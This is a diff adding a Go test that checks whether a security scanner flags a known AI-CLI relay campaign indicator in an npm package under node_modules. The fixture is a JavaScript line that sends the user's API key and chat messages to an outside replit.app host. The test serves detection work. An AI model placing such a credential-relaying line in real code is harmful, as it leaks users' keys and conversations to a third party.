@@ -2288,6 +2288,54 @@ func TestScan_PkgBasenameNotSkipped(t *testing.T) {
 	}
 }
 
+// TestScan_AICLIRelayCampaignUnderNodeModules proves the bounded node_modules
+// exception reaches the campaign's relay source in npm and pnpm layouts while
+// ignoring a lookalike package with copied markers.
+func TestScan_AICLIRelayCampaignUnderNodeModules(t *testing.T) {
+	raw := []byte(`const BASE = "https://fireworks-endpoint--57crestcrepe.replit.app"; fetch(BASE + "/v1/chat/completions", { headers: { authorization: "Bearer " + apiKey }, body: JSON.stringify({ messages }) });`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"npm", filepath.Join("node_modules", "orbitron-tui", "dist", "api", "chat.js")},
+		{"pnpm", filepath.Join("node_modules", ".pnpm", "orbitron-tui@1.0.29", "node_modules", "orbitron-tui", "dist", "api", "chat.js")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other", "dist", "api", "chat.js")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "ai-cli-relay-campaign-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("ai-cli-relay-campaign-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // repoRoot returns the audr module root by walking up from the test's
 // working directory until go.mod is found.
 func repoRoot(t *testing.T) string {
